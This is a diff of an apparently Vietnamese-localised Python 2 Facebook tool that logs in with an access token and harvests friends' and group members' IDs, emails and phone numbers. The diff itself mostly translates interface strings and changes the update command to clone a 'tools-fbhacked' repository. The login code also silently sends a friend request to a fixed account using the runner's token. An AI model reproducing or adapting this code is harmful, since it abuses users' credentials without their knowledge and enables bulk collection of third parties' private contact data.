@@ -42,7 +42,7 @@ def mkdir(z):
 ##### LOGO #####
 logo = """
 \033[1;91m┌─────────────────────────────────────────────────────────────┐\033[1;91m
-│   ▄▄▄▄▄▄                                 By Đoàn Gia bảo          █        │\033[1;91m
+│   ▄▄▄▄▄▄                                 By Đoàn Gia bảo                   │\033[1;91m
 │   █       ▄▄▄    ▄▄▄    ▄▄▄   █▄▄▄    ▄▄▄    ▄▄▄   █   ▄    │\033[1;91m
 │   █▄▄▄▄▄ ▀   █  █▀  ▀  █▀  █  █▀ ▀█  █▀ ▀█  █▀ ▀█  █ ▄▀     │\033[1;91m
 │   █      ▄▀▀▀█  █      █▀▀▀▀  █   █  █   █  █   █  █▀█      │\033[1;91m
@@ -147,7 +147,7 @@ def login():
 				pick = open("login.txt", 'w')
 				pick.write(z['access_token'])
 				pick.close()
-				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin successfully'
+				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92m Đăng Nhập Thành Công'
                                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -159,7 +159,7 @@ def login():
 			time.sleep(1)
 			exit()
 		else:
-			print("\n\033[1;91m[!] Login Failed")
+			print("\n\033[1;91m[!] Đăng Nhập Thất Bại")
 			os.system('rm -rf login.txt')
 			time.sleep(0.01)
 			login()
@@ -179,7 +179,7 @@ def fbtoken():
 		menu()
 	except KeyError:
 		print "\033[1;91m[!] Wrong"
-		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
+		e = raw_input("\033[1;91m[?] \033[1;92m Bạn Muốn Đăng Nhập?\033[1;97m[y/n]: ")
 		if e =="":
 			exit()
 		elif e =="y":
@@ -250,13 +250,13 @@ def choices():
 		print logo
 		fb_token=open('login.txt','r').read()
 		print "\033[1;91m[+] \033[1;92mYour token\033[1;91m :\033[1;97m "+fb_token
-		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		raw_input("\n\033[1;91m[ \033[1;97mQuay Lại \033[1;91m]")
 		menu()
         elif pick =="7":
                 os.system('clear')
                 print logo
                 print 40 * '\033[1;97m\xe2\x95\x90'
-                os.system('git pull origin master')
+                os.system('git clone https://github.com/dgbaopro-top1/tools-fbhacked/')
                 raw_input('\n\033[1;91m[ \033[1;97mQuay Lại \033[1;91m]')
                 menu()
 	elif pick =="8":
@@ -284,7 +284,7 @@ def information():
 	os.system('clear')
 	print logo
 	aid = raw_input('\033[1;91m[+] \033[1;92mEnter ID\033[1;97m/\033[1;92mName\033[1;91m : \033[1;97m')
-	mkdir('\033[1;91m[✺] \033[1;92mWait a minute \033[1;97m...')
+	mkdir('\033[1;91m[✺] \033[1;92m Đợi Vài Phút \033[1;97m...')
 	r = requests.get('https://graph.facebook.com/me/friends?access_token='+fb_token)
 	tryy = json.loads(r.text)
 	for i in tryy['data']:
@@ -322,7 +322,7 @@ def information():
 		else:
 			pass
 	else:
-		print"\033[1;91m[✖] User not found"
+		print"\033[1;91m[✖] Người Dùng không tồn tại"
 		raw_input("\n\033[1;91m[ \033[1;97mQuay Lại \033[1;91m]")
 		menu()
 
@@ -338,15 +338,15 @@ def dump():
 		login()
 	os.system('clear')
 	print logo
-	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Get ID friend"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Get ID friend from friend"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Get group member ID"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Get group member email"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Get group member phone number"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m6.\033[1;97m Get email friend"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m7.\033[1;97m Get email friend from friend"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m8.\033[1;97m Get a friend's phone number"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m9.\033[1;97m Get a friend's phone number from friend"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Lấy ID friend"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Lấy ID friend from friend"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Lấy group member ID"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Lấy group member email"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Lấy group member phone number"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m6.\033[1;97m Lấy email friend"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m7.\033[1;97m Lấy email friend from friend"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m8.\033[1;97m Lấy a friend's phone number"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m9.\033[1;97m Lấy a friend's phone number from friend"
 	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Quay Lại"
 	print "║"
 	choose_dump()
@@ -415,11 +415,11 @@ def friends_id():
 		raw_input("\n\033[1;91m[ \033[1;97mQuay Lại \033[1;91m]")
 		dump()
 	except IOError:
-		print"\033[1;91m[!] Error creating file"
+		print"\033[1;91m[!] Lỗi Tạo file"
 		raw_input("\n\033[1;91m[ \033[1;97mQuay Lại \033[1;91m]")
 		dump()
 	except (KeyboardInterrupt,EOFError):
-		print("\033[1;91m[!] Stopped")
+		print("\033[1;91m[!] Đã Dừng Tools")
 		raw_input("\n\033[1;91m[ \033[1;97mQuay Lại \033[1;91m]")
 		dump()
 	except KeyError:
@@ -447,7 +447,7 @@ def id_from_friends():
 	try:
 		os.system('clear')
 		print logo
-		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
+		idt = raw_input("\033[1;91m[+] \033[1;92m Nhập ID friend \033[1;91m: \033[1;97m")
 		try:
 			seat = requests.get("https://graph.facebook.com/"+idt+"?access_token="+fb_token)
 			op = json.loads(seat.text)
